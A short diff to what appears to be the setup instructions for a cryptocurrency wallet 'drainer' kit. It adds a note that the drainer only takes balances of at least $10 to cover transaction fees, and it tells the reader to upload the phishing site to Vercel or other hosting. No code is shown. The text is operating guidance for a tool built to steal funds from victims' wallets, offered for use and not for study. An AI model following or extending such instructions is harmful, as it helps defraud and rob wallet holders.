@@ -43,6 +43,9 @@ It should look like this
 
 
 All is setup your drainer is ready to go. 
+
+📛 THE DRAINER ONLY DRAIN BALANCE WITH MINIMUM 10.00$ FOR COVERING TRANSACTION FEE 📛
+
 Upload your website on Vercel or any Hosting
 
 
